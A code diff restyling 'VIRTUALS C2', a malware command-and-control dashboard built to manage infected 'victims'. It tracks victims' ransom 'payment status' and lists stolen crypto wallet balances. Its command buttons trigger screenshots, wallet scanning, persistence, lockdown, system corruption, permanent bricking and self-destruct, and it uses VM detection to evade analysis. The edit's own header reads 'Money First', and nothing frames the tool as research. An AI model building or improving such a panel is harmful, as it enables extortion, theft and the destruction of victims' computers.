@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - ULTIMATE EDITION
-Complete C2 Panel with VM Detection & Auto-Brick
+VIRTUALS C2 - PROFESSIONAL EDITION
+Clean UI · VM Safe · Money First
 BY: YOUR STAR BESTIE
 """
 
@@ -24,11 +24,12 @@ for folder in folders:
         os.makedirs(folder)
 
 # ============================================
-# VM DETECTION SYSTEM
+# VM DETECTION SYSTEM - SAFE MODE
 # ============================================
 class VMDetector:
     @staticmethod
     def check_all():
+        """Returns VM detection results WITHOUT auto-bricking"""
         checks = {
             'registry': VMDetector.check_registry(),
             'processes': VMDetector.check_processes(),
@@ -45,7 +46,8 @@ class VMDetector:
             'is_vm': is_vm,
             'confidence': confidence,
             'checks': checks,
-            'details': VMDetector.get_details()
+            'details': VMDetector.get_details(),
+            'safe_mode': True  # NEVER auto-brick without confirmation
         }
     
     @staticmethod
@@ -193,7 +195,7 @@ def get_db():
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS victims (
         id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, is_vm INTEGER DEFAULT 0,
-        vm_details TEXT, first_seen TEXT, last_seen TEXT
+        vm_details TEXT, first_seen TEXT, last_seen TEXT, payment_status TEXT DEFAULT 'pending'
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS commands (
         id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, result TEXT, timestamp TEXT
@@ -214,7 +216,7 @@ def get_db():
     return conn
 
 # ============================================
-# SAMPLE WALLET DATA
+# SAMPLE WALLET DATA WITH BALANCES
 # ============================================
 SAMPLE_WALLETS = {
     "BTC": {"address": "bc1qrk2p7m3eqnrtwhh5w2kfp4qjqlemgyzmt650x6", "balance": 2.45, "usd": 245000},
@@ -225,313 +227,422 @@ SAMPLE_WALLETS = {
 }
 
 # ============================================
-# HTML DASHBOARD - FULL UI
+# HTML DASHBOARD - CLEAN PROFESSIONAL
 # ============================================
 HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VIRTUALS C2 - ULTIMATE</title>
+    <title>VIRTUALS C2</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#0a0a0a; color:#ffffff; font-family:'Courier New',monospace; height:100vh; overflow:hidden; }
-        ::-webkit-scrollbar { width:6px; }
-        ::-webkit-scrollbar-track { background:#0a0a0a; }
-        ::-webkit-scrollbar-thumb { background:#333; border-radius:3px; }
-        ::-webkit-scrollbar-thumb:hover { background:#fff; }
+        /* --- RESET & BASE --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0d0d0f;
+            color: #c8c8c8;
+            font-family: 'Segoe UI', 'Courier New', monospace;
+            height: 100vh;
+            overflow: hidden;
+            font-size: 13px;
+        }
+        ::-webkit-scrollbar { width: 5px; height: 5px; }
+        ::-webkit-scrollbar-track { background: #1a1a1e; }
+        ::-webkit-scrollbar-thumb { background: #3a3a3e; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #5a5a5e; }
+
+        /* --- HEADER --- */
         .header {
-            background:#0a0a0a;
-            padding:10px 20px;
-            border-bottom:2px solid #ffffff;
-            display:flex;
-            justify-content:space-between;
-            align-items:center;
-            flex-wrap:wrap;
-            gap:8px;
-            height:55px;
+            background: #0d0d0f;
+            padding: 8px 20px;
+            border-bottom: 1px solid #2a2a2e;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            height: 44px;
         }
-        .header h1 { color:#ffffff; font-size:20px; letter-spacing:2px; }
-        .header h1 span { color:#666; }
-        .header .stats { display:flex; gap:12px; flex-wrap:wrap; }
+        .header h1 {
+            color: #e8e8e8;
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 3px;
+        }
+        .header h1 span { color: #666; }
+        .header .stats { display: flex; gap: 12px; flex-wrap: wrap; }
         .header .stats .stat-item {
-            background:#0a0a0a;
-            border:1px solid #333;
-            padding:3px 12px;
-            border-radius:4px;
+            color: #888;
+            font-size: 11px;
         }
-        .header .stats .stat-item .label { color:#666; font-size:9px; text-transform:uppercase; }
-        .header .stats .stat-item .num { color:#fff; font-weight:bold; font-size:14px; margin-left:4px; }
+        .header .stats .stat-item .num {
+            color: #e8e8e8;
+            font-weight: 600;
+            margin-left: 4px;
+        }
+
+        /* --- LAYOUT --- */
         .container {
-            display:flex;
-            height:calc(100vh - 55px);
-            padding:6px;
-            gap:6px;
+            display: flex;
+            height: calc(100vh - 44px);
+            padding: 6px;
+            gap: 6px;
         }
+
+        /* --- LEFT PANEL --- */
         .left-panel {
-            width:170px;
-            min-width:170px;
-            display:flex;
-            flex-direction:column;
-            gap:6px;
+            width: 150px;
+            min-width: 150px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
         }
         .commands-panel {
-            background:#0a0a0a;
-            border:1px solid #ffffff;
-            border-radius:6px;
-            padding:10px;
-            overflow-y:auto;
-            flex:1;
+            background: #111114;
+            border: 1px solid #222226;
+            border-radius: 4px;
+            padding: 8px 6px;
+            flex: 1;
+            overflow-y: auto;
         }
-        .commands-panel h2 {
-            color:#666;
-            font-size:9px;
-            text-transform:uppercase;
-            text-align:center;
-            letter-spacing:3px;
-            border-bottom:1px solid #333;
-            padding-bottom:6px;
-            margin-bottom:6px;
+        .commands-panel .title {
+            color: #666;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-align: center;
+            border-bottom: 1px solid #1a1a1e;
+            padding-bottom: 6px;
+            margin-bottom: 6px;
         }
         .cmd-btn {
-            display:block;
-            width:100%;
-            padding:5px 8px;
-            margin:2px 0;
-            background:#0a0a0a;
-            border:1px solid #333;
-            border-radius:4px;
-            color:#ffffff;
-            font-family:'Courier New',monospace;
-            font-size:10px;
-            cursor:pointer;
-            text-align:left;
-            transition:all 0.2s;
+            display: block;
+            width: 100%;
+            padding: 4px 6px;
+            margin: 2px 0;
+            background: transparent;
+            border: 1px solid #222226;
+            border-radius: 3px;
+            color: #b8b8b8;
+            font-family: inherit;
+            font-size: 11px;
+            cursor: pointer;
+            text-align: left;
+            transition: all 0.15s;
         }
-        .cmd-btn:hover { background:#1a1a1a; border-color:#ffffff; }
-        .cmd-btn .desc { color:#666; font-size:7px; display:block; }
-        .cmd-btn.danger { border-color:#ff4444; color:#ff4444; }
-        .cmd-btn.brick { border-color:#ff6600; color:#ff6600; }
-        .cmd-btn.oblivion { border-color:#ff00ff; color:#ff00ff; }
-        .cmd-btn.screenshot { border-color:#00ccff; color:#00ccff; }
-        .cmd-btn.vmcheck { border-color:#ffaa00; color:#ffaa00; }
+        .cmd-btn:hover {
+            background: #1a1a1e;
+            border-color: #3a3a3e;
+            color: #e8e8e8;
+        }
+        .cmd-btn .desc {
+            color: #555;
+            font-size: 9px;
+            display: block;
+        }
+        .cmd-btn.danger { border-color: #442222; color: #cc6666; }
+        .cmd-btn.danger:hover { border-color: #884444; background: #1a0a0a; }
+        .cmd-btn.brick { border-color: #443322; color: #cc8855; }
+        .cmd-btn.brick:hover { border-color: #886644; background: #1a100a; }
+
+        /* --- MIDDLE PANEL --- */
         .middle-panel {
-            flex:1;
-            display:flex;
-            flex-direction:column;
-            gap:6px;
-            min-width:250px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            min-width: 250px;
         }
+
+        /* --- VICTIM LIST (MODERN) --- */
         .victims-panel {
-            background:#0a0a0a;
-            border:1px solid #ffffff;
-            border-radius:6px;
-            padding:10px;
-            height:35%;
+            background: #111114;
+            border: 1px solid #222226;
+            border-radius: 4px;
+            padding: 8px 10px;
+            height: 38%;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
         }
-        .victims-panel h2 {
-            color:#666;
-            font-size:9px;
-            text-transform:uppercase;
-            letter-spacing:3px;
-            border-bottom:1px solid #333;
-            padding-bottom:6px;
-            margin-bottom:6px;
+        .victims-panel .title {
+            color: #666;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px solid #1a1a1e;
+            padding-bottom: 4px;
+            margin-bottom: 6px;
+            flex-shrink: 0;
         }
         .victim-list {
-            display:flex;
-            flex-wrap:wrap;
-            gap:5px;
-            max-height:calc(100% - 25px);
-            overflow-y:auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 4px;
+            overflow-y: auto;
+            flex: 1;
+            align-content: start;
+            padding-right: 2px;
         }
         .victim-card {
-            background:#0a0a0a;
-            border:1px solid #333;
-            border-radius:4px;
-            padding:4px 8px;
-            cursor:pointer;
-            min-width:100px;
-            transition:all 0.2s;
-            position:relative;
+            background: #151518;
+            border: 1px solid #222226;
+            border-radius: 4px;
+            padding: 5px 8px;
+            cursor: pointer;
+            transition: all 0.15s;
+            display: flex;
+            flex-direction: column;
+            position: relative;
         }
-        .victim-card:hover { border-color:#ffffff; }
-        .victim-card.selected { border-color:#ffffff; background:#1a1a1a; }
-        .victim-card .name { color:#fff; font-size:11px; font-weight:bold; }
-        .victim-card .ip { color:#888; font-size:9px; }
-        .victim-card .status { font-size:8px; }
-        .victim-card .status.online { color:#0f0; }
-        .victim-card .status.offline { color:#f44; }
+        .victim-card:hover {
+            border-color: #3a3a3e;
+            background: #1a1a1e;
+        }
+        .victim-card.selected {
+            border-color: #4a6a8a;
+            background: #1a222a;
+        }
+        .victim-card .top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .victim-card .name {
+            color: #e8e8e8;
+            font-size: 12px;
+            font-weight: 500;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .victim-card .ip {
+            color: #666;
+            font-size: 10px;
+        }
+        .victim-card .bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 1px;
+        }
+        .victim-card .status {
+            font-size: 9px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .victim-card .status .dot {
+            display: inline-block;
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+        }
+        .victim-card .status .dot.online { background: #44aa66; }
+        .victim-card .status .dot.offline { background: #664444; }
         .victim-card .vm-badge {
-            position:absolute;
-            top:-4px;
-            right:-4px;
-            background:#ff4444;
-            color:#fff;
-            font-size:7px;
-            padding:1px 5px;
-            border-radius:10px;
+            background: #442222;
+            color: #cc6666;
+            font-size: 8px;
+            padding: 0 6px;
+            border-radius: 10px;
+            line-height: 14px;
+            height: 14px;
         }
+        .victim-card .payment-status {
+            font-size: 8px;
+            padding: 0 6px;
+            border-radius: 10px;
+            line-height: 14px;
+            height: 14px;
+        }
+        .victim-card .payment-status.paid { background: #224422; color: #66aa66; }
+        .victim-card .payment-status.pending { background: #443322; color: #cc8855; }
+
+        /* --- CHAT PANEL --- */
         .chat-panel {
-            background:#0a0a0a;
-            border:1px solid #ffffff;
-            border-radius:6px;
-            padding:10px;
-            flex:1;
-            display:flex;
-            flex-direction:column;
+            background: #111114;
+            border: 1px solid #222226;
+            border-radius: 4px;
+            padding: 8px 10px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
         }
-        .chat-panel h2 {
-            color:#666;
-            font-size:9px;
-            text-transform:uppercase;
-            letter-spacing:3px;
-            border-bottom:1px solid #333;
-            padding-bottom:6px;
-            margin-bottom:6px;
+        .chat-panel .title {
+            color: #666;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px solid #1a1a1e;
+            padding-bottom: 4px;
+            margin-bottom: 6px;
+            flex-shrink: 0;
         }
         .chat-messages {
-            background:#0a0a0a;
-            border:1px solid #333;
-            border-radius:4px;
-            padding:8px;
-            min-height:100px;
-            max-height:180px;
-            overflow-y:auto;
-            flex:1;
-            font-size:11px;
+            background: #0a0a0c;
+            border: 1px solid #1a1a1e;
+            border-radius: 3px;
+            padding: 6px;
+            flex: 1;
+            overflow-y: auto;
+            min-height: 80px;
+            max-height: 160px;
+            font-size: 11px;
+            line-height: 1.5;
         }
-        .chat-messages .msg { padding:2px 0; border-bottom:1px solid #111; }
-        .chat-messages .time { color:#666; margin-right:8px; }
-        .chat-messages .sender.hacker { color:#0f0; }
-        .chat-messages .sender.victim { color:#f84; }
-        .chat-messages .sender.system { color:#888; }
-        .chat-messages .sender.output { color:#0ff; }
-        .chat-messages .sender.wallet { color:#ffd700; }
-        .chat-messages .sender.screenshot { color:#00ccff; }
-        .chat-messages .sender.vm { color:#ff4444; font-weight:bold; }
+        .chat-messages .msg { padding: 1px 0; }
+        .chat-messages .time { color: #555; margin-right: 8px; font-size: 10px; }
+        .chat-messages .sender.bot { color: #66bbaa; font-weight: 500; }
+        .chat-messages .sender.victim { color: #bb8844; }
+        .chat-messages .sender.system { color: #666; }
+        .chat-messages .sender.notification { color: #88aacc; }
+        
         .chat-input-area {
-            display:flex;
-            gap:8px;
-            margin-top:8px;
+            display: flex;
+            gap: 6px;
+            margin-top: 6px;
+            flex-shrink: 0;
         }
         .chat-input-area input {
-            flex:1;
-            padding:8px;
-            background:#0a0a0a;
-            border:1px solid #333;
-            border-radius:4px;
-            color:#fff;
-            font-family:'Courier New',monospace;
-            font-size:12px;
+            flex: 1;
+            padding: 5px 8px;
+            background: #0a0a0c;
+            border: 1px solid #1a1a1e;
+            border-radius: 3px;
+            color: #c8c8c8;
+            font-family: inherit;
+            font-size: 12px;
+            outline: none;
         }
-        .chat-input-area input:focus { outline:none; border-color:#fff; }
+        .chat-input-area input:focus { border-color: #3a4a5a; }
+        .chat-input-area input::placeholder { color: #444; }
         .chat-input-area button {
-            padding:8px 20px;
-            background:#0a0a0a;
-            color:#fff;
-            border:1px solid #fff;
-            border-radius:4px;
-            cursor:pointer;
-            font-family:'Courier New',monospace;
-            transition:all 0.2s;
+            padding: 5px 14px;
+            background: transparent;
+            color: #b8b8b8;
+            border: 1px solid #2a2a2e;
+            border-radius: 3px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 11px;
+            transition: all 0.15s;
         }
-        .chat-input-area button:hover { background:#1a1a1a; }
+        .chat-input-area button:hover {
+            background: #1a1a1e;
+            border-color: #4a4a4e;
+        }
+
+        /* --- RIGHT PANEL --- */
         .right-panel {
-            width:280px;
-            min-width:280px;
-            display:flex;
-            flex-direction:column;
-            gap:6px;
+            width: 250px;
+            min-width: 250px;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
         }
         .details-panel {
-            background:#0a0a0a;
-            border:1px solid #ffffff;
-            border-radius:6px;
-            padding:10px;
-            height:40%;
-            overflow-y:auto;
+            background: #111114;
+            border: 1px solid #222226;
+            border-radius: 4px;
+            padding: 8px 10px;
+            height: 45%;
+            overflow-y: auto;
         }
-        .details-panel h2 {
-            color:#666;
-            font-size:9px;
-            text-transform:uppercase;
-            text-align:center;
-            letter-spacing:3px;
-            border-bottom:1px solid #333;
-            padding-bottom:6px;
-            margin-bottom:6px;
+        .details-panel .title {
+            color: #666;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-align: center;
+            border-bottom: 1px solid #1a1a1e;
+            padding-bottom: 4px;
+            margin-bottom: 6px;
         }
-        .detail-item { padding:3px 0; border-bottom:1px solid #1a1a1a; font-size:11px; }
-        .detail-item .label { color:#666; }
-        .detail-item .value { color:#fff; float:right; }
-        .output-panel {
-            background:#0a0a0a;
-            border:1px solid #ffffff;
-            border-radius:6px;
-            padding:10px;
-            flex:1;
-            overflow-y:auto;
+        .detail-item {
+            padding: 2px 0;
+            border-bottom: 1px solid #151518;
+            font-size: 11px;
+            display: flex;
+            justify-content: space-between;
         }
-        .output-panel h2 {
-            color:#666;
-            font-size:9px;
-            text-transform:uppercase;
-            text-align:center;
-            letter-spacing:3px;
-            border-bottom:1px solid #333;
-            padding-bottom:6px;
-            margin-bottom:6px;
-        }
-        .output-item {
-            padding:3px 0;
-            border-bottom:1px solid #111;
-            font-size:10px;
-        }
-        .output-item .type {
-            display:inline-block;
-            padding:0 6px;
-            border-radius:3px;
-            font-size:8px;
-            margin-right:6px;
-        }
-        .output-item .type.wallet { background:#ffd700; color:#000; }
-        .output-item .type.screenshot { background:#00ccff; color:#000; }
-        .output-item .type.vm { background:#ff4444; color:#fff; }
-        .output-item .type.command { background:#0f0; color:#000; }
+        .detail-item .label { color: #666; }
+        .detail-item .value { color: #c8c8c8; }
+
         .screenshot-gallery {
-            display:flex;
-            flex-wrap:wrap;
-            gap:5px;
-            margin-top:5px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-top: 4px;
         }
         .screenshot-thumb {
-            width:80px;
-            height:60px;
-            background:#1a1a1a;
-            border:1px solid #333;
-            border-radius:4px;
-            cursor:pointer;
-            overflow:hidden;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            font-size:8px;
-            color:#666;
+            width: 60px;
+            height: 45px;
+            background: #151518;
+            border: 1px solid #222226;
+            border-radius: 3px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 8px;
+            color: #555;
+            transition: all 0.15s;
         }
-        .screenshot-thumb:hover { border-color:#fff; }
-        @media(max-width:1024px) {
-            .left-panel { width:140px; min-width:140px; }
-            .right-panel { width:220px; min-width:220px; }
+        .screenshot-thumb:hover { border-color: #3a3a3e; }
+
+        .output-panel {
+            background: #111114;
+            border: 1px solid #222226;
+            border-radius: 4px;
+            padding: 8px 10px;
+            flex: 1;
+            overflow-y: auto;
         }
-        @media(max-width:768px) {
-            .container { flex-direction:column; }
-            .left-panel { width:100%; flex-direction:row; min-width:100%; }
-            .commands-panel { display:flex; flex-wrap:wrap; gap:4px; height:auto; max-height:120px; }
-            .commands-panel h2 { width:100%; }
-            .cmd-btn { width:auto; flex:1; min-width:80px; }
-            .right-panel { width:100%; min-width:100%; flex-direction:row; }
-            .details-panel { height:auto; max-height:200px; width:50%; }
-            .output-panel { height:auto; max-height:200px; width:50%; }
+        .output-panel .title {
+            color: #666;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px solid #1a1a1e;
+            padding-bottom: 4px;
+            margin-bottom: 6px;
+        }
+        .output-item {
+            padding: 2px 0;
+            border-bottom: 1px solid #111114;
+            font-size: 10px;
+            display: flex;
+            gap: 6px;
+        }
+        .output-item .type {
+            padding: 0 4px;
+            border-radius: 2px;
+            font-size: 8px;
+            text-transform: uppercase;
+            flex-shrink: 0;
+        }
+        .output-item .type.success { background: #224422; color: #66aa66; }
+        .output-item .type.failed { background: #442222; color: #cc6666; }
+        .output-item .type.info { background: #222244; color: #6688cc; }
+        .output-item .type.wallet { background: #443322; color: #cc8855; }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 1024px) {
+            .left-panel { width: 130px; min-width: 130px; }
+            .right-panel { width: 200px; min-width: 200px; }
+            .victim-list { grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); }
+        }
+        @media (max-width: 768px) {
+            .container { flex-direction: column; }
+            .left-panel { width: 100%; flex-direction: row; min-width: 100%; }
+            .commands-panel { display: flex; flex-wrap: wrap; gap: 3px; height: auto; max-height: 80px; }
+            .commands-panel .title { width: 100%; }
+            .cmd-btn { width: auto; flex: 1; min-width: 70px; }
+            .right-panel { width: 100%; min-width: 100%; flex-direction: row; }
+            .details-panel { height: auto; max-height: 180px; width: 50%; }
+            .output-panel { height: auto; max-height: 180px; width: 50%; }
+            .victim-list { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
         }
     </style>
 </head>
@@ -539,60 +650,65 @@ HTML = """
     <div class="header">
         <h1>◈ VIRTUALS <span>C2</span></h1>
         <div class="stats">
-            <div class="stat-item"><span class="label">VICTIMS</span><span class="num" id="victimCount">0</span></div>
-            <div class="stat-item"><span class="label">ONLINE</span><span class="num" id="onlineCount">0</span></div>
-            <div class="stat-item"><span class="label">VMs</span><span class="num" id="vmCount">0</span></div>
-            <div class="stat-item"><span class="label">COMMANDS</span><span class="num" id="cmdCount">0</span></div>
+            <span class="stat-item">VICTIMS <span class="num" id="victimCount">0</span></span>
+            <span class="stat-item">ONLINE <span class="num" id="onlineCount">0</span></span>
+            <span class="stat-item">VMS <span class="num" id="vmCount">0</span></span>
+            <span class="stat-item">COMMANDS <span class="num" id="cmdCount">0</span></span>
+            <span class="stat-item">NOTIFICATIONS <span class="num" id="notifCount">0</span></span>
         </div>
     </div>
     <div class="container">
         <div class="left-panel">
             <div class="commands-panel">
-                <h2>⚡ COMMANDS</h2>
-                <button class="cmd-btn" onclick="sendCommand('whois')">whois <span class="desc">PC Info</span></button>
-                <button class="cmd-btn screenshot" onclick="sendCommand('screenshot')">screenshot <span class="desc">Capture Screen</span></button>
-                <button class="cmd-btn" onclick="sendCommand('flash')">flash <span class="desc">Flash Screen</span></button>
-                <button class="cmd-btn" onclick="sendCommand('scan')">scan <span class="desc">Crypto Scan</span></button>
-                <button class="cmd-btn" onclick="sendCommand('persist')">persist <span class="desc">Persistence</span></button>
-                <button class="cmd-btn" onclick="sendCommand('lockdown')">lockdown <span class="desc">Lock Screen</span></button>
-                <button class="cmd-btn danger" onclick="sendCommand('destroy')">destroy <span class="desc">Kill PC</span></button>
-                <button class="cmd-btn brick" onclick="sendCommand('brick')">brick <span class="desc">BRICK PC</span></button>
-                <button class="cmd-btn vmcheck" onclick="sendCommand('vmcheck')">vmcheck <span class="desc">Check for VM</span></button>
-                <button class="cmd-btn oblivion" onclick="sendCommand('oblivion')">oblivion <span class="desc">Self Destruct</span></button>
+                <div class="title">Commands</div>
+                <button class="cmd-btn" onclick="sendCommand('whois')">whois <span class="desc">system info</span></button>
+                <button class="cmd-btn" onclick="sendCommand('screenshot')">screenshot <span class="desc">capture screen</span></button>
+                <button class="cmd-btn" onclick="sendCommand('flash')">flash <span class="desc">flash screen</span></button>
+                <button class="cmd-btn" onclick="sendCommand('scan')">scan <span class="desc">crypto wallets</span></button>
+                <button class="cmd-btn" onclick="sendCommand('persist')">persist <span class="desc">persistence</span></button>
+                <button class="cmd-btn" onclick="sendCommand('lockdown')">lockdown <span class="desc">lock system</span></button>
+                <button class="cmd-btn danger" onclick="sendCommand('destroy')">destroy <span class="desc">corrupt system</span></button>
+                <button class="cmd-btn brick" onclick="sendCommand('brick')">brick <span class="desc">permanent brick</span></button>
+                <button class="cmd-btn" onclick="sendCommand('vmcheck')">vmcheck <span class="desc">vm detection</span></button>
+                <button class="cmd-btn" onclick="sendCommand('oblivion')">oblivion <span class="desc">self destruct</span></button>
             </div>
         </div>
         <div class="middle-panel">
             <div class="victims-panel">
-                <h2>🎯 VICTIMS</h2>
-                <div class="victim-list" id="victimList"><div style="color:#666;font-size:11px;">No victims connected</div></div>
+                <div class="title">Victims</div>
+                <div class="victim-list" id="victimList">
+                    <div style="color:#555;font-size:11px;text-align:center;padding:10px;">No victims connected</div>
+                </div>
             </div>
             <div class="chat-panel">
-                <h2>💬 OUTPUT CHANNEL</h2>
+                <div class="title">Command Console</div>
                 <div class="chat-messages" id="chatMessages">
-                    <div class="msg"><span class="time">[System]</span><span class="sender system">VIRTUALS</span> Dashboard ready - VM Detection Active</div>
+                    <div class="msg"><span class="time">[system]</span><span class="sender system">virtuals</span> ready</div>
                 </div>
                 <div class="chat-input-area">
-                    <input id="chatInput" placeholder="Type /command or message..." onkeypress="if(event.key==='Enter')sendMessage()">
-                    <button onclick="sendMessage()">SEND</button>
+                    <input id="chatInput" placeholder="/command or message" onkeypress="if(event.key==='Enter')sendMessage()">
+                    <button onclick="sendMessage()">send</button>
                 </div>
             </div>
         </div>
         <div class="right-panel">
             <div class="details-panel">
-                <h2>📋 VICTIM DETAILS</h2>
-                <div id="victimDetails"><div style="color:#666;font-size:11px;text-align:center;padding:15px;">Select a victim</div></div>
-                <h2 style="margin-top:8px;">📸 SCREENSHOTS</h2>
-                <div class="screenshot-gallery" id="screenshotGallery"><div style="color:#666;font-size:10px;">No screenshots</div></div>
+                <div class="title">Victim Details</div>
+                <div id="victimDetails"><div style="color:#555;font-size:11px;text-align:center;padding:15px;">select a victim</div></div>
+                <div style="margin-top:6px;border-top:1px solid #1a1a1e;padding-top:6px;">
+                    <div style="color:#666;font-size:9px;text-transform:uppercase;letter-spacing:2px;">Screenshots</div>
+                    <div class="screenshot-gallery" id="screenshotGallery"><div style="color:#555;font-size:10px;">none</div></div>
+                </div>
             </div>
             <div class="output-panel">
-                <h2>📊 COMMAND OUTPUT</h2>
-                <div id="commandOutput"><div style="color:#666;font-size:10px;">No output</div></div>
+                <div class="title">Command Output</div>
+                <div id="commandOutput"><div style="color:#555;font-size:10px;">no output</div></div>
             </div>
         </div>
     </div>
-    
+
     <script>
-        let state = { victims: {}, selectedVictim: null, commands: {}, cmdCount: 0 };
+        let state = { victims: {}, selectedVictim: null, commands: {}, cmdCount: 0, notifications: 0 };
         
         function api(action, data, callback) {
             fetch('/api', {
@@ -616,15 +732,23 @@ HTML = """
             const container = document.getElementById('victimList');
             const victims = Object.values(state.victims);
             if (victims.length === 0) {
-                container.innerHTML = '<div style="color:#666;font-size:11px;">No victims connected</div>';
+                container.innerHTML = '<div style="color:#555;font-size:11px;text-align:center;padding:10px;">No victims connected</div>';
                 return;
             }
             container.innerHTML = victims.map(v => `
                 <div class="victim-card ${state.selectedVictim === v.id ? 'selected' : ''}" onclick="selectVictim('${v.id}')">
-                    <div class="name">${v.pc}</div>
-                    <div class="ip">${v.ip}</div>
-                    <div class="status ${v.status === 'Online' ? 'online' : 'offline'}">${v.status}</div>
-                    ${v.is_vm ? '<span class="vm-badge">VM</span>' : ''}
+                    <div class="top">
+                        <span class="name">${v.pc}</span>
+                        <span class="ip">${v.ip}</span>
+                    </div>
+                    <div class="bottom">
+                        <span class="status">
+                            <span class="dot ${v.status === 'Online' ? 'online' : 'offline'}"></span>
+                            ${v.status}
+                        </span>
+                        ${v.is_vm ? '<span class="vm-badge">VM</span>' : ''}
+                        <span class="payment-status ${v.payment_status === 'paid' ? 'paid' : 'pending'}">${v.payment_status || 'pending'}</span>
+                    </div>
                 </div>
             `).join('');
         }
@@ -640,14 +764,14 @@ HTML = """
             const v = state.victims[id];
             if (!v) return;
             document.getElementById('victimDetails').innerHTML = `
-                <div class="detail-item"><span class="label">ID:</span><span class="value">${v.id}</span></div>
-                <div class="detail-item"><span class="label">PC:</span><span class="value">${v.pc}</span></div>
-                <div class="detail-item"><span class="label">IP:</span><span class="value">${v.ip}</span></div>
-                <div class="detail-item"><span class="label">OS:</span><span class="value">${v.os || 'Unknown'}</span></div>
-                <div class="detail-item"><span class="label">Status:</span><span class="value" style="color:${v.status==='Online'?'#0f0':'#f44'}">${v.status}</span></div>
-                <div class="detail-item"><span class="label">VM Detected:</span><span class="value" style="color:${v.is_vm ? '#ff4444' : '#0f0'}">${v.is_vm ? '⚠ YES' : '✓ NO'}</span></div>
-                ${v.vm_details ? `<div class="detail-item"><span class="label">VM Details:</span><span class="value" style="font-size:9px;">${v.vm_details}</span></div>` : ''}
-                <div class="detail-item"><span class="label">Commands:</span><span class="value">${(state.commands[id]||[]).length}</span></div>
+                <div class="detail-item"><span class="label">id</span><span class="value">${v.id}</span></div>
+                <div class="detail-item"><span class="label">pc</span><span class="value">${v.pc}</span></div>
+                <div class="detail-item"><span class="label">ip</span><span class="value">${v.ip}</span></div>
+                <div class="detail-item"><span class="label">os</span><span class="value">${v.os || 'unknown'}</span></div>
+                <div class="detail-item"><span class="label">status</span><span class="value" style="color:${v.status==='Online'?'#66aa66':'#886666'}">${v.status}</span></div>
+                <div class="detail-item"><span class="label">vm</span><span class="value" style="color:${v.is_vm?'#cc6666':'#66aa66'}">${v.is_vm ? 'detected' : 'clean'}</span></div>
+                <div class="detail-item"><span class="label">payment</span><span class="value" style="color:${v.payment_status==='paid'?'#66aa66':'#cc8855'}">${v.payment_status || 'pending'}</span></div>
+                <div class="detail-item"><span class="label">commands</span><span class="value">${(state.commands[id]||[]).length}</span></div>
             `;
         }
         
@@ -655,12 +779,12 @@ HTML = """
             api('getScreenshots', { victim_id: id }, data => {
                 const container = document.getElementById('screenshotGallery');
                 if (!data.success || !data.screenshots || data.screenshots.length === 0) {
-                    container.innerHTML = '<div style="color:#666;font-size:10px;">No screenshots</div>';
+                    container.innerHTML = '<div style="color:#555;font-size:10px;">none</div>';
                     return;
                 }
                 container.innerHTML = data.screenshots.map(s => `
                     <div class="screenshot-thumb" onclick="viewScreenshot('${s.filename}')">
-                        📷 ${s.filename.split('_')[1] || 'ss'}
+                        ${s.filename.split('_')[1] || 'ss'}
                     </div>
                 `).join('');
             });
@@ -676,14 +800,17 @@ HTML = """
             document.getElementById('onlineCount').textContent = victims.filter(v => v.status === 'Online').length;
             document.getElementById('vmCount').textContent = victims.filter(v => v.is_vm).length;
             document.getElementById('cmdCount').textContent = state.cmdCount;
+            document.getElementById('notifCount').textContent = state.notifications;
         }
         
         function sendCommand(command) {
             if (!state.selectedVictim) {
-                addMessage('System', 'Select a victim first!', 'system');
+                addMessage('system', 'select a victim first', 'system');
                 return;
             }
-            addMessage('VIRTUALS', '/' + command + ' -> ' + state.selectedVictim, 'hacker');
+            
+            addMessage('bot', 'executing /' + command + ' on ' + state.selectedVictim, 'bot');
+            
             api('sendCommand', { victim_id: state.selectedVictim, command: command }, data => {
                 if (data.success) {
                     if (!state.commands[state.selectedVictim]) state.commands[state.selectedVictim] = [];
@@ -693,22 +820,35 @@ HTML = """
                         time: new Date().toLocaleTimeString()
                     });
                     state.cmdCount++;
-                    addMessage('OUTPUT', command.toUpperCase() + ': ' + data.result, 'output');
+                    state.notifications++;
+                    
+                    addMessage('bot', 'success: ' + command, 'bot');
